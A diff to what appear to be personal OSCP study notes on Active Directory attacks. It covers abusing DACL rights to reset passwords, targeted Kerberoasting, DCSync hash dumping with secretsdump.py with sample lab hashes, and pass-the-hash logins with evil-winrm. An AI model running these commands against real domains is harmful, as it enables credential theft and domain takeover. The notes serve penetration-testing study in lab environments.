@@ -49,7 +49,7 @@ impacket-dacledit -action write -rights 'WriteMembers' -principal '<User1>' -tar
 Now either add own account to target group, or reset target account password 
 (Reference this link: https://www.hackingarticles.in/abusing-ad-dacl-writeowner/)
 
-In the particalar example the target user was Cert Authority user, so I could do this:
+In the particular example the target user was Cert Authority user, so I could do this:
 
 http://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html#vulnerable-certificate-template-access-control---esc4
 ```
@@ -63,4 +63,28 @@ $SecPassword = ConvertTo-SecureString '<User1 Pass>' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential ('<Domain>\<User1>', SecPassword)
 $UserPassword = ConvertToSecureString 'qweQWE123!@#!' -AsPlainText -Force
 Set-DomainUserPassword -Identity <User2> -AccountPassword $UserPassword -Credential $Cred
+```
+
+### GenericWrite
+Use `TargetedKerberoast`
+
+https://github.com/nestef23/my-OSCP-notes/blob/main/Active%20Directory/Kerberoasting.md#targetedkerberospy
+
+### DCSync
+```
+secretsdump.py '<Domain>'/'<User>':'<Password>'@'<DC Name / IP>'
+```
+This dumps a lot of hashes
+```
+[...]
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
+administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
+[...]
+```
+Use them with `evil-winrm`
+```
+evil-winrm -i <domain> -u <user> -H'<NT hash - 2nd part>'
+
 ```
